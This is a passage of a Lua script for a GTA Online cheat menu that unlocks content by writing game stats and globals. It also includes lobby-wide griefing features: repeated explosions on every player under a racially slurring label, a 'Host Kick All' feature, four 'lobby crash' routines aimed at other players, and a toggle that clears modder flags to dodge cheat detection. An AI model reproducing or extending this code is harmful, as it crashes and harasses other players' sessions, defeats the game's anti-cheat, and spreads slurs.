    menu.notify("Tuners Awards Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #LS_TUNERS_DLC_IT do
        stat_set_int(LS_TUNERS_DLC_IT[i][1], true, LS_TUNERS_DLC_IT[i][2])
    for i = 2, #LS_TUNERS_DLC_BL do
        stat_set_bool(LS_TUNERS_DLC_BL[i][1], true, LS_TUNERS_DLC_BL[i][2])
        end
    end
end)
menu.add_feature("Unlock Vehicle Challenge", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Successfully Unlocked Challenge", "Unknown's Unlocker", 4, 257818)
    for i = 1, #LS_TUNERS_PRIZE_BL do
        stat_set_bool(LS_TUNERS_PRIZE_BL[i][1], true, LS_TUNERS_PRIZE_BL[i][2])
    for i = 2, #LS_TUNERS_PRICE_IT do
        stat_set_int(LS_TUNERS_PRICE_IT[i][1], true, LS_TUNERS_PRICE_IT[i][2])
        end
    end
end)
menu.add_feature("Unlock Drip Feed Vehicles", "toggle", lobbrecovery.id, function(feat, pid)
    menu.notify("You can leave this option active if you want to play with the new cars in missions, heists and free mode\n\nThe cars are available for purchase!", "Unknown's Unlocker", 5, 3578712200220)
    while bit.on do 
    script.set_global_i(262145 + 30494, 1)
    script.set_global_i(262145 + 30498, 1)
    script.set_global_i(262145 + 30499, 1)
    script.set_global_i(262145 + 30500, 1)
    script.set_global_i(262145 + 30488, 1)
    script.set_global_i(262145 + 30486, 1)
    script.set_global_i(262145 + 30493, 1)
    system.wait(1)
        if not bit.on then return end
    end
end)
menu.add_feature("Unlock Drip Feed Outfits", "toggle", lobbrecovery.id, function(feat, pid)
    menu.notify("Sprunk Bodysuit\nCola Parachute Bag\nSprunk Parachute Bag\nHalloween Parachute Bag\nLos Santos Customs tee-shirt\nKnuckleduster Tee\nRampage Tee", "Unknown's Unlocker", 15, 3578712200220)
    menu.notify("Several items have been unlocked:\n\nPenitentiary Coverall outfit (delayed)\nBanshee Logo black & blue t-shirt\nBorn X Raised black, blue and white t-shirt\nCircoloco Tee\nBaseball Bat Tee\nWasted! Tee\nRockstar Games Typeface Tee\nSprunk x eCola", "Unknown's Unlocker", 15, 3578712200220)
    while hk.on do
        script.set_global_i(262145 + 30657, 1)
        script.set_global_i(262145 + 30658, 1)
        script.set_global_i(262145 + 30659, 1)
        script.set_global_i(262145 + 30660, 1)
        script.set_global_i(262145 + 30661, 1)
        script.set_global_i(262145 + 30662, 1)
        script.set_global_i(262145 + 30663, 1)
        script.set_global_i(262145 + 30664, 1)
        script.set_global_i(262145 + 30665, 1)
        script.set_global_i(262145 + 30666, 1)
        script.set_global_i(262145 + 30667, 1)
        script.set_global_i(262145 + 30668, 1)
        script.set_global_i(262145 + 30669, 1)
        script.set_global_i(262145 + 30670, 1)
        script.set_global_i(262145 + 30671, 1)
        script.set_global_i(262145 + 30672, 1)
        script.set_global_i(262145 + 30673, 1)
        script.set_global_i(262145 + 30674, 1)
        script.set_global_i(262145 + 30675, 1)
        script.set_global_i(262145 + 30676, 1)
        script.set_global_i(262145 + 30677, 1)
        script.set_global_i(262145 + 30678, 1)
        script.set_global_i(262145 + 30679, 1)
    if not hk.on then return end
    system.wait(1)
    end
end)

menu.add_feature("Unlock All", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Unlocking Everything..", "Unknown's Unlocker", 4, 257818)

    system.yield(2000)

    menu.notify("Unlocked Nothing LOL", "Unknown's Unlocker", 4, 257818)
end)
menu.add_feature("Unlock XMAS Liveries", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("All XMAS Liveries Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #UNLK_XMAS do
        stat_set_int(UNLK_XMAS[i][1], false, UNLK_XMAS[i][2])
    end
end)
menu.add_feature("Unlock all Arena Wars Trophy and Toys", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Arena Wars Trophy & Toys unlocked, switch sessions.", "Unknown's Unlocker", 4, 257818)
    for i = 1, #ARENA_W_UNLK do
        stat_set_int(ARENA_W_UNLK[i][1], true, ARENA_W_UNLK[i][2])
    for i = 2, #ARENA_W_UNLK_BL do
        stat_set_bool(ARENA_W_UNLK_BL[i][1], true, ARENA_W_UNLK_BL[i][2])
        stat_set_bool(ARENA_W_UNLK_BL[i][1], false, ARENA_W_UNLK_BL[i][2])
    end
    end
end)
menu.add_feature("Unlock Don't Cross the Line Tee", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Unlocked Don't Cross The Line Tee, Available at any clothing store.", "Unknown's Unlocker", 4, 257818)
    for i = 1, #DCTL_UNLK do
        stat_set_int(DCTL_UNLK[i][1], true, DCTL_UNLK[i][2])
    end
end)
menu.add_feature("Unlock Shotaro", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Shotaro is now avaliable to purchase at Legendary Motorsport", "Unknown's Unlocker", 4, 257818)
    for i = 1, #SHT_UNLK do
        stat_set_int(SHT_UNLK[i][1], true, SHT_UNLK[i][2])
    end
end)
menu.add_feature("Unlock Summer 2020 Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Summer 2020 Awards Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #SUMR2020_AWARDS_BL do
        stat_set_bool(SUMR2020_AWARDS_BL[i][1], true, SUMR2020_AWARDS_BL[i][2])
        stat_set_bool(SUMR2020_AWARDS_BL[i][1], false, SUMR2020_AWARDS_BL[i][2])
    end
end)
menu.add_feature("Unlock Yacht Missions", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Yacht Missions Unlocked~s~", "Unknown's Unlocker", 4, 257818)
    for i = 1, #YCHT_MS do
        stat_set_int(YCHT_MS[i][1], true, YCHT_MS[i][2])
    end
end)
menu.add_feature("Unlock Flight School Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Flight School Awards Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #FLY_SCHOOL_I do
        stat_set_int(FLY_SCHOOL_I[i][1], true, FLY_SCHOOL_I[i][2])
    for i = 2, #FLY_SCHOOL_B do
        stat_set_bool(FLY_SCHOOL_B[i][1], true, FLY_SCHOOL_B[i][2])
        end
    end
end)
menu.add_feature("Unlock Vanilla Unicorn Awards", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("Vanilla Unicorn Awards Unlocked", "Unknown's Unlocker", 4, 257818)
    for i = 1, #VANNIL_AWD do
        stat_set_int(VANNIL_AWD[i][1], true, VANNIL_AWD[i][2])
    end
end)
menu.add_feature("Unlock Packie McReary", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("NOTE: it is experimental, it may not work correctly.", "Unknown's Unlocker", 4, 780000)
    for i = 1, #UNLCK_PATRICK do
        stat_set_int(UNLCK_PATRICK[i][1], true, UNLCK_PATRICK[i][2])
    end
end)
menu.add_feature("Unlock All Outfits in Facility", "action", lobbrecovery.id, function(feat, pid)
    for i = 1, #UNLCK_FCIOU do
        stat_set_int(UNLCK_FCIOU[i][1], true, UNLCK_FCIOU[i][2])
    end
    menu.notify("Unlocked all Facility outfits!", "Unknown's Unlocker", 4, 257818)
end)
menu.add_feature("Unlock Burning Heart Tattoo", "action", lobbrecovery.id, function(feat, pid)
    for i = 1, #UNLCK_BGHTO do
        stat_set_int(UNLCK_BGHTO[i][1], true, UNLCK_BGHTO[i][2])
    end
    menu.notify("Unlocked Burning Heart Tattoo!", "Unknown's Unlocker", 4, 257818)
end)
menu.add_feature("Unlock All IMP/EXP Special Vehicle Work", "action", lobbrecovery.id, function(feat, pid)
    for i = 1, #UNLCK_IESVW do
        stat_set_int(UNLCK_IESVW[i][1], true, UNLCK_IESVW[i][2])
    end
    menu.notify("Unlocked all Import/Export Special Vehicle Work!", "Unknown's Unlocker", 4, 257818)
end)
menu.add_feature("Unlock Ceramic Pistol", "action", lobbrecovery.id, function(feat, pid)
    for i = 1, #UNLCK_CPPSL do
        stat_set_int(UNLCK_CPPSL[i][1], true, UNLCK_CPPSL[i][2])
    end
    menu.notify("Unlocked Ceramic Pistol!", "Unknown's Unlocker", 4, 257818)
end)
menu.add_feature("Unlock Cayo Perico Unlockables", "action", lobbrecovery.id, function(feat, pid)
    menu.notify("These items will be in the store unlocked for purchase\n\nT-shirts\nJackets\nSweaters\nCaps\nGlow glasses\nGlow necklaces\nSpecial glasses\nDJ T-shirts", "Unknown's Unlocker", 5, 3578712200220)
        -- T-shirts/Jackets/Sweaters
        script.set_global_i(262145 + 29688, 1)
        script.set_global_i(262145 + 29689, 1)
        script.set_global_i(262145 + 29690, 1)
        script.set_global_i(262145 + 29691, 1)
        script.set_global_i(262145 + 29692, 1)
        script.set_global_i(262145 + 29693, 1)
        script.set_global_i(262145 + 29694, 1)
        script.set_global_i(262145 + 29695, 1)
        script.set_global_i(262145 + 29696, 1)
        script.set_global_i(262145 + 29697, 1)
        script.set_global_i(262145 + 29698, 1)
        script.set_global_i(262145 + 29699, 1)
        script.set_global_i(262145 + 29700, 1)
        script.set_global_i(262145 + 29701, 1)
        script.set_global_i(262145 + 29702, 1)
        script.set_global_i(262145 + 29703, 1)
        script.set_global_i(262145 + 29704, 1)
        script.set_global_i(262145 + 29705, 1)
        script.set_global_i(262145 + 29706, 1)
        script.set_global_i(262145 + 29707, 1)
        -- Shorts
        script.set_global_i(262145 + 29708, 1)
        script.set_global_i(262145 + 29709, 1)
        script.set_global_i(262145 + 29710, 1)
        script.set_global_i(262145 + 29711, 1)
        -- Caps
        script.set_global_i(262145 + 29712, 1)
        script.set_global_i(262145 + 29713, 1)
        script.set_global_i(262145 + 29714, 1)
        script.set_global_i(262145 + 29715, 1)
        script.set_global_i(262145 + 29716, 1)
        -- Glow bracelets
        script.set_global_i(262145 + 29717, 1)
        script.set_global_i(262145 + 29718, 1)
        script.set_global_i(262145 + 29719, 1)
        script.set_global_i(262145 + 29720, 1)
        script.set_global_i(262145 + 29721, 1)
        script.set_global_i(262145 + 29722, 1)
        script.set_global_i(262145 + 29723, 1)
        script.set_global_i(262145 + 29724, 1)
        script.set_global_i(262145 + 29725, 1)
        script.set_global_i(262145 + 29726, 1)
        script.set_global_i(262145 + 29727, 1)
        script.set_global_i(262145 + 29728, 1)
        -- Glow glasses
        script.set_global_i(262145 + 29729, 1)
        script.set_global_i(262145 + 29730, 1)
        script.set_global_i(262145 + 29731, 1)
        script.set_global_i(262145 + 29732, 1)
        script.set_global_i(262145 + 29733, 1)
        script.set_global_i(262145 + 29734, 1)
        script.set_global_i(262145 + 29735, 1)
        script.set_global_i(262145 + 29736, 1)
        script.set_global_i(262145 + 29737, 1)
        script.set_global_i(262145 + 29738, 1)
        script.set_global_i(262145 + 29739, 1)
        script.set_global_i(262145 + 29740, 1)
        -- Glow necklaces
        script.set_global_i(262145 + 29741, 1)
        script.set_global_i(262145 + 29742, 1)
        script.set_global_i(262145 + 29743, 1)
        script.set_global_i(262145 + 29744, 1)
        script.set_global_i(262145 + 29745, 1)
        script.set_global_i(262145 + 29746, 1)
        script.set_global_i(262145 + 29747, 1)
        script.set_global_i(262145 + 29748, 1)
        script.set_global_i(262145 + 29749, 1)
        script.set_global_i(262145 + 29750, 1)
        script.set_global_i(262145 + 29751, 1)
        script.set_global_i(262145 + 29752, 1)
        script.set_global_i(262145 + 29753, 1)
        script.set_global_i(262145 + 29754, 1)
        script.set_global_i(262145 + 29755, 1)
        script.set_global_i(262145 + 29756, 1)
        -- Full head masks
        script.set_global_i(262145 + 29761, 1)
        script.set_global_i(262145 + 29762, 1)
        script.set_global_i(262145 + 29763, 1)
        script.set_global_i(262145 + 29764, 1)
        script.set_global_i(262145 + 29765, 1)
        script.set_global_i(262145 + 29766, 1)
        script.set_global_i(262145 + 29767, 1)
        script.set_global_i(262145 + 29768, 1)
        script.set_global_i(262145 + 29769, 1)
        script.set_global_i(262145 + 29770, 1)
        script.set_global_i(262145 + 29771, 1)
        script.set_global_i(262145 + 29772, 1)
        script.set_global_i(262145 + 29773, 1)
        script.set_global_i(262145 + 29774, 1)
        script.set_global_i(262145 + 29775, 1)
        script.set_global_i(262145 + 29776, 1)
        script.set_global_i(262145 + 29777, 1)
        script.set_global_i(262145 + 29778, 1)
        script.set_global_i(262145 + 29779, 1)
        script.set_global_i(262145 + 29780, 1)
        -- Special glasses
        script.set_global_i(262145 + 30345, 1)
        script.set_global_i(262145 + 30346, 1)
        script.set_global_i(262145 + 30347, 1)
        script.set_global_i(262145 + 30348, 1)
        script.set_global_i(262145 + 30349, 1)
        script.set_global_i(262145 + 30350, 1)
        script.set_global_i(262145 + 30351, 1)
        script.set_global_i(262145 + 30352, 1)
        script.set_global_i(262145 + 30353, 1)
        script.set_global_i(262145 + 30354, 1)
        script.set_global_i(262145 + 30355, 1)
        script.set_global_i(262145 + 30356, 1)
        script.set_global_i(262145 + 30357, 1)
        script.set_global_i(262145 + 30358, 1)
        script.set_global_i(262145 + 30359, 1)
        script.set_global_i(262145 + 30360, 1)
        script.set_global_i(262145 + 30361, 1)
        script.set_global_i(262145 + 30362, 1)
        script.set_global_i(262145 + 30363, 1)
        script.set_global_i(262145 + 30364, 1)
        script.set_global_i(262145 + 30365, 1)
        script.set_global_i(262145 + 30366, 1)
        script.set_global_i(262145 + 30367, 1)
        script.set_global_i(262145 + 30368, 1)
        script.set_global_i(262145 + 30369, 1)
        script.set_global_i(262145 + 30370, 1)
        script.set_global_i(262145 + 30371, 1)
        script.set_global_i(262145 + 30372, 1)
        script.set_global_i(262145 + 30373, 1)
        script.set_global_i(262145 + 30374, 1)
        script.set_global_i(262145 + 30375, 1)
        script.set_global_i(262145 + 30376, 1)
        script.set_global_i(262145 + 30377, 1)
        script.set_global_i(262145 + 30378, 1)
        script.set_global_i(262145 + 30379, 1)
        script.set_global_i(262145 + 30380, 1)
        -- DJ's T-shirts
        script.set_global_i(262145 + 30390, 1)
        script.set_global_i(262145 + 30391, 1)
        script.set_global_i(262145 + 30392, 1)
        script.set_global_i(262145 + 30393, 1)
        script.set_global_i(262145 + 30394, 1)
        script.set_global_i(262145 + 30395, 1)
end)



----------------- recovery stuff above ----------------------------------------
---------------- lobby misc stuff below ----------------------------------------
menu.add_feature("Tug entities", "toggle", lobbie.id, function(f)
		

	menu.notify("Shoot first entity then second entity. Second entity will be the one getting tugged.")
	local car = {}
	
	
	if f.on then
		for i = 1, 2 do
			while not ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id())) do
				system.wait(0)
			end
			if ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id())) then
				if i == 1 then
					menu.notify("Shoot second entity to tug")
				end
				car[i] = player.get_entity_player_is_aiming_at(player.player_id())
				if entity.is_entity_a_ped(car[i]) then
					car[i] = ped.get_vehicle_ped_is_using(car[i])
				end
				if car[2] == car[1] then
					menu.notify("Second entity cant be the same as the first one")
					return HANDLER_POP
				end
			end
			system.wait(0)
		end
	end
	if car[2] then
		local coord1 = v3(5, 5, 5)
		local coord2 = v3(-5, -5, -5)
		while f.on do
			local offset = entity.get_entity_coords(car[1])
			local offset2 = entity.get_entity_coords(car[2])
			offset.x = offset.x - offset2.x
			offset.y = offset.y - offset2.y
			offset.z = offset.z - offset2.z
			if (offset.x > coord1.x or offset.y > coord1.y or offset.z > coord1.z) or (offset.x < coord2.x or offset.y < coord2.y or offset.z < coord2.z) then
				if (offset.x > 10 or offset.y > 10 or offset.z > 10) or (offset.x < -10 or offset.y < -10 or offset.z < -10) then
					offset.x = offset.x * 2
					offset.y = offset.y * 2
					offset.z = offset.z * 2
				end
				while not network.request_control_of_entity(car[2]) do
					network.request_control_of_entity(car[2])
					system.wait(0)
				end
				entity.set_entity_velocity(car[2], offset)
			end
			system.wait(0)
			
			if tugcontrol then
			tugcontrol = false
			else
			tugcontrol = true 
			end	
			
			
		
		end
	end

end)


menu.add_feature("Chernobyl Niggers", "toggle", lobbie.id, function(f, pid) 
	while f.on do 
		system.wait(25)
		for pid = 0, 32 do
     	 local valid = valid_check(pid)
      	 if valid ~= -1 then
			for x = 30, 0, -5 do
				system.wait(50)
				local pos = player.get_player_coords(pid)
				pos.z = pos.z + x
				fire.add_explosion(pos, 8, true, false, 0, pid)
				ui.notify_above_map("Lobby is Being Chernobyl'd :|", "MS", 14)
			end
			end
		end
	end
end)

menu.add_feature("Host Kick All", "action", lobbie.id, function(feat)
    hostkickall()
    
    return HANDLER_POP
    end)

    menu.add_feature("Send Custom SMS to lobby", "action", lobbie.id, function(f, pid)
        local custom, SC = input.get("Enter Custom SMS", "", 128, 0)
            while custom == 1 do
            system.yield(0)
                 custom, SC = input.get("Enter Custom SMS", "", 128, 0)
            end
                  if custom == 2 then
                    return HANDLER_POP
                 end
    
                 for pid = 0 ,31 do
                     if ValidScid(scid) then
            player.send_player_sms(pid, SC)
        end
        end
    end)
    
    
    menu.add_feature("Unmark All the Dirty Whores", "toggle", lobbie.id, function(prots, pid)
        while prots.on do 
            for pid = 0,32 do
            system.wait(25)
            player.unset_player_as_modder(pid, -1)
        end
        end
    end)


---------------- lobby misc stuff above ----------------------------------------
---------------- lobby hidden misc stuff below ---------------------------------\
local get_host=menu.add_feature(
    "Host looting",
    "toggle",
    lobbymisc.id,
    function(a)
        while a.on and not network.network_is_host() do
            system.yield(0)
				local nothing, friends = get_host()
				if friends then
					break
				end
		end
    end


)

------------------ hidden lobby misc stuff above ------------------------------


---------------- lobby crashes below -------------------------------------------
menu.add_feature("lobby crash v1", "action", lobbycrash.id, function(feat)
    if feat.on then
        pos = player.get_player_coords(player.player_id())
                Outfits()
                pedp = player.get_player_ped(player.player_id())
                if player.is_player_female(player.player_id()) then
                  for i = 0, 15 do
                    modelsyncv2woman()
                  end
                else
                  for i = 0, 15 do
                    modelsyncv1man()
                  end
                end
                clone = ped.clone_ped(pedp)
                system.wait(1)
                entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
                system.wait(500)
                Restore()
        mypos = player.get_player_coords(player.player_id())
        Outfits()
        for i = 1 , 32 do
        mc()
        end
        system.wait(5000)
        Restore()
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
      --  local me = player.player_id()
        local a_c_fish = 0x2FD800B7
        local a_c_stingray = -1589092019
        local a_c_sharktiger = 	113504370
        local a_c_sharkhammer = 1015224100
        local a_c_dolphin = -1950698411
        local a_c_killerwhale = -1920284487
        local a_c_humpback = 1193010354
      --  local player = player.get_player_model(me)
             streaming.request_model(a_c_fish)
         while(not streaming.has_model_loaded(a_c_fish))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_fish)
             streaming.set_model_as_no_longer_needed(a_c_fish)
             system.wait(15000)
             streaming.request_model(a_c_stingray)
         while(not streaming.has_model_loaded(a_c_stingray))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_stingray)
             streaming.set_model_as_no_longer_needed(a_c_stingray)
             system.wait(15000)
             streaming.request_model(a_c_sharktiger)
         while(not streaming.has_model_loaded(a_c_sharktiger))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharktiger)
             streaming.set_model_as_no_longer_needed(a_c_sharktiger)
             system.wait(15000)
             streaming.request_model(a_c_sharkhammer)
         while(not streaming.has_model_loaded(a_c_sharkhammer))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharkhammer)
             streaming.set_model_as_no_longer_needed(a_c_sharkhammer)
             system.wait(15000)
             streaming.request_model(a_c_dolphin)
         while(not streaming.has_model_loaded(a_c_dolphin))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_dolphin)
             streaming.set_model_as_no_longer_needed(a_c_dolphin)
             system.wait(15000)
             streaming.request_model(a_c_killerwhale)
         while(not streaming.has_model_loaded(a_c_killerwhale))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_killerwhale)
             streaming.set_model_as_no_longer_needed(a_c_killerwhale)
             system.wait(15000)
             streaming.request_model(a_c_humpback)
         while(not streaming.has_model_loaded(a_c_humpback))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_humpback)
             streaming.set_model_as_no_longer_needed(a_c_humpback)
             local me = player.player_id()
-- ped.set_ped_health(PlyPed(player.player_id()),  1)
    local a_c_fish = 0x2FD800B7
        local a_c_stingray = -1589092019
        local a_c_sharktiger = 	113504370
        local a_c_sharkhammer = 1015224100
        local a_c_dolphin = -1950698411
        local a_c_killerwhale = -1920284487
        local a_c_humpback = 1193010354
        local conq1 = 0x9C9EFFD8
        local conq2 = 0x705E61F2
        ped.set_ped_health(PlyPed(me),  1)
        system.wait(100)
        streaming.request_model(conq1)
         while(not streaming.has_model_loaded(conq1))
         do
         system.wait(10)
           end
          player.set_player_model(conq1)
             streaming.set_model_as_no_longer_needed(conq1)
             ped.resurrect_ped(player.get_player_ped(me))
             system.wait(100)
             ped.set_ped_health(PlyPed(me),  1)
             streaming.request_model(conq2)
         while(not streaming.has_model_loaded(conq2))
         do
         system.wait(10)
           end
          player.set_player_model(conq2)
             streaming.set_model_as_no_longer_needed(conq2)
             system.wait(10)
             streaming.request_model(conq1)
             while(not streaming.has_model_loaded(conq1))
             do
             system.wait(10)
               end
              player.set_player_model(conq1)
                 streaming.set_model_as_no_longer_needed(conq1)
                 ped.resurrect_ped(player.get_player_ped(me))
                 system.wait(100)
             ped.set_ped_health(PlyPed(me),  1)
             streaming.request_model(a_c_fish)
         while(not streaming.has_model_loaded(a_c_fish))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_fish)
             streaming.set_model_as_no_longer_needed(a_c_fish)
             system.wait(25)
             streaming.request_model(a_c_stingray)
         while(not streaming.has_model_loaded(a_c_stingray))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_stingray)
             streaming.set_model_as_no_longer_needed(a_c_stingray)
             system.wait(25)
             streaming.request_model(a_c_sharktiger)
         while(not streaming.has_model_loaded(a_c_sharktiger))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharktiger)
             streaming.set_model_as_no_longer_needed(a_c_sharktiger)
             system.wait(25)
             streaming.request_model(a_c_sharkhammer)
         while(not streaming.has_model_loaded(a_c_sharkhammer))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharkhammer)
             streaming.set_model_as_no_longer_needed(a_c_sharkhammer)
             system.wait(25)
             streaming.request_model(a_c_dolphin)
         while(not streaming.has_model_loaded(a_c_dolphin))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_dolphin)
             streaming.set_model_as_no_longer_needed(a_c_dolphin)
             system.wait(25)
             streaming.request_model(a_c_killerwhale)
         while(not streaming.has_model_loaded(a_c_killerwhale))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_killerwhale)
             streaming.set_model_as_no_longer_needed(a_c_killerwhale)
             system.wait(25)
             streaming.request_model(a_c_humpback)
         while(not streaming.has_model_loaded(a_c_humpback))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_humpback)
             streaming.set_model_as_no_longer_needed(a_c_humpback)
        --     system.wait(15000)
       --      streaming.request_model(player)
      --   while(not streaming.has_model_loaded(player))
     --    do
      --   system.wait(10)
       --    end
      ----    player.set_player_model(player)
       --      streaming.set_model_as_no_longer_needed(player)
       if network.network_is_host() then
        hostnotify = false
        for i = 0, 32 do
            if player.is_player_valid(i) then

                if i ~= player.player_id() then
                    if i ~= player.is_player_friend(i) then
                        hka1337(i)
                    end
                end
            end
        end
    end
end
    end)

    menu.add_feature("lobby crash v2", "action", lobbycrash.id, function(feat)
        if feat.on then
            local me = player.player_id()
-- ped.set_ped_health(PlyPed(player.player_id()),  1)
    local a_c_fish = 0x2FD800B7
        local a_c_stingray = -1589092019
        local a_c_sharktiger = 	113504370
        local a_c_sharkhammer = 1015224100
        local a_c_dolphin = -1950698411
        local a_c_killerwhale = -1920284487
        local a_c_humpback = 1193010354
        local conq1 = 0x9C9EFFD8
        local conq2 = 0x705E61F2
        ped.set_ped_health(PlyPed(me),  1)
        system.wait(100)
        streaming.request_model(conq1)
         while(not streaming.has_model_loaded(conq1))
         do
         system.wait(10)
           end
          player.set_player_model(conq1)
             streaming.set_model_as_no_longer_needed(conq1)
             ped.resurrect_ped(player.get_player_ped(me))
             system.wait(100)
             ped.set_ped_health(PlyPed(me),  1)
             streaming.request_model(conq2)
         while(not streaming.has_model_loaded(conq2))
         do
         system.wait(10)
           end
          player.set_player_model(conq2)
             streaming.set_model_as_no_longer_needed(conq2)
             system.wait(10)
             streaming.request_model(conq1)
             while(not streaming.has_model_loaded(conq1))
             do
             system.wait(10)
               end
              player.set_player_model(conq1)
                 streaming.set_model_as_no_longer_needed(conq1)
                 ped.resurrect_ped(player.get_player_ped(me))
                 system.wait(100)
             ped.set_ped_health(PlyPed(me),  1)
             streaming.request_model(a_c_fish)
         while(not streaming.has_model_loaded(a_c_fish))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_fish)
             streaming.set_model_as_no_longer_needed(a_c_fish)
             system.wait(25)
             streaming.request_model(a_c_stingray)
         while(not streaming.has_model_loaded(a_c_stingray))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_stingray)
             streaming.set_model_as_no_longer_needed(a_c_stingray)
             system.wait(25)
             streaming.request_model(a_c_sharktiger)
         while(not streaming.has_model_loaded(a_c_sharktiger))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharktiger)
             streaming.set_model_as_no_longer_needed(a_c_sharktiger)
             system.wait(25)
             streaming.request_model(a_c_sharkhammer)
         while(not streaming.has_model_loaded(a_c_sharkhammer))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_sharkhammer)
             streaming.set_model_as_no_longer_needed(a_c_sharkhammer)
             system.wait(25)
             streaming.request_model(a_c_dolphin)
         while(not streaming.has_model_loaded(a_c_dolphin))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_dolphin)
             streaming.set_model_as_no_longer_needed(a_c_dolphin)
             system.wait(25)
             streaming.request_model(a_c_killerwhale)
         while(not streaming.has_model_loaded(a_c_killerwhale))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_killerwhale)
             streaming.set_model_as_no_longer_needed(a_c_killerwhale)
             system.wait(25)
             streaming.request_model(a_c_humpback)
         while(not streaming.has_model_loaded(a_c_humpback))
         do
         system.wait(10)
           end
          player.set_player_model(a_c_humpback)
             streaming.set_model_as_no_longer_needed(a_c_humpback)
             if network.network_is_host() then
                hostnotify = false
                for i = 0, 32 do
                    if player.is_player_valid(i) then
    
                        if i ~= player.player_id() then
                            if i ~= player.is_player_friend(i) then
                                hka1337(i)
             end 
            end
        end
    end
end
end
end)


menu.add_feature("lobby crash v3", "action", lobbycrash.id, function(feat)
    if feat.on then
        mypos = player.get_player_coords(player.player_id())
        Outfits()
        for i = 1 , 32 do
        mc()
        end
        system.wait(5000)
        Restore()
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
        for i = 0, 32 do
         if player.is_player_valid(i) then
         if i ~= player.player_id() then
         if i ~= player.is_player_friend(i) then
          hka1337(i)
         end
        end
    end
end
end
         end)

         menu.add_feature("lobby crash v4", "action", lobbycrash.id, function(feat)
            if feat.on then
                pos = player.get_player_coords(player.player_id())
                Outfits()
                pedp = player.get_player_ped(player.player_id())
                if player.is_player_female(player.player_id()) then
                  for i = 0, 15 do
                    modelsyncv2woman()
                  end
                else
                  for i = 0, 15 do
                    modelsyncv1man()
                  end
                end
                clone = ped.clone_ped(pedp)
                system.wait(1)
                entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
                system.wait(500)
                Restore()
                for i = 0, 32 do
                    if player.is_player_valid(i) then
                    if i ~= player.player_id() then
                    if i ~= player.is_player_friend(i) then
                     hka1337(i)
                    end
                end
            end
        end
    end
              end)






---------------- lobby crashes above ----------------------------------------

--- NEW
local get_host=menu.add_feature(
    "Get Host",
    "toggle",
    selfplayer.id,
    function(a)
        while a.on and not network.network_is_host() do
            system.yield(0)
				local nothing, friends = get_host()
				if friends then
					break
				end
		end
    end


)

menu.add_feature("Set Handcuffs Locked Position", "action", selfplayer.id, function(feat)
    pped = player.get_player_ped(player.player_id())

    if player.is_player_female(player.player_id()) then
        ped.set_ped_component_variation(pped, 7, 25, 0, 0)
        weapon.give_delayed_weapon_to_ped(pped, 0xD04C944D, 0, 1)
        elseif not player.is_player_female(player.player_id()) then
        ped.set_ped_component_variation(pped, 7, 41, 0, 0)
        weapon.give_delayed_weapon_to_ped(pped, 0xD04C944D, 0, 1)
    end
        
    end)


    menu.add_feature("Vehicle weapons rapid fire", "value_str", selfplayer.id, function (feat)
      if feat.on then
        if feat.value == 0 then
          if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
            vehicle.set_vehicle_fixed(ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id())))
            system.wait(0)
          end
        end
        if feat.value == 1 then
          if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
            vehicle.set_vehicle_fixed(ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id())))
            system.wait(50)
          end
        end
        if feat.value == 2 then
          if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
            vehicle.set_vehicle_fixed(ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id())))
            system.wait(100)
          end
        end
        return HANDLER_CONTINUE
      end
      return HANDLER_POP
    end): set_str_data{"Fast", "Normal", "Slow"}


    menu.add_feature("sight Airstrike", "toggle", selfplayer.id, function(f) --- BROKEN
        local we, Ped, pid = gameplay.get_hash_key("weapon_airstrike_rocket"), player.get_player_ped(player.player_id()), player.player_id()
        while f.on do
          local Pos, d = get_collision_vector(pid, Ped)
          if d > 3 then
            gameplay.shoot_single_bullet_between_coords(Pos, Pos, 1000, we, Ped, true, false, 250)
          end
          system.yield(0)
        end
      end)
      
    
      menu.add_feature("sight RailGun", "toggle", selfplayer.id, function(f) --- BROKEN
